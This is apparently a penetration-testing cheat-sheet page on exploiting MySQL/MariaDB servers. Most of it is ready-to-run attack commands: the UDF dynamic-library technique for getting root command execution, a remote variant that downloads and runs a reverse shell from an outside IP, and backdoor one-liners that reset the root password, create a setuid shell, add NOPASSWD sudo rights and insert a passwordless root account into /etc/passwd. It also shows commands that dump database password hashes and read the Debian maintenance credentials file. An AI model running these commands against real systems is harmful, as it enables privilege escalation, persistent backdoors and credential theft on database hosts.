# MYSQL 3306

### MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library 1518.c (local db ser)

{% code overflow="wrap" %}
```
$ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c 1518.c
 * $ gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/j0hn/1518.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/1518.so';
 * mysql> create function do_system returns integer soname '1518.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown j0hn.j0hn /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]
```
{% endcode %}

#### remote db ser example = hex approach instead of load\_file

<pre><code>mariadb (connect from kali to remote db ser need use hex approach):
* mysql> use mysql;
 * mysql> create table foo(line blob);
 set @pwn = 0x7f... ;
 select @@plugin_dir;
 * mysql> select binary @pwn into dumpfile '/home/dev/plugin/1518.so';
 * mysql> create function do_system returns integer soname '1518.so';
 * mysql> select * from mysql.func;
select do_system('wget http://192.168.119.173/rev');
select do_system('chmod +x ./rev');
<strong>select do_system('./rev');
</strong></code></pre>

{% hint style="info" %}
not necessarily a root user, may still need get .elf rev shell first
{% endhint %}

generate hex

```
xxd -p 1518.so | tr -d '\n' > 1518.so.hex (need 0x prefix for set @pwn)
```

{% embed url="https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mysql-mariadb" %}

<pre><code>using do_system custom function to change root user password:
mysql >> select do_system('echo "pass123" | passwd --stdin root');

or

select do_system('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
\! sh
/tmp/sh

or
<strong>'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
</strong><strong>
</strong><strong>or
</strong><strong>'echo "dummy::0:0::/root:/bin/bash" >>/etc/passwd'
</strong></code></pre>

### Credentials

{% code overflow="wrap" %}
```
select user,authentication_string from user

grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"

cat /etc/mysql/debian.cnf
```
{% endcode %}

### enum

{% code overflow="wrap" %}
```
SHOW Grants;
show variables; 
#(check hostname, plugin_dir, tmpdir, version, version_compile_machine)

```
{% endcode %}
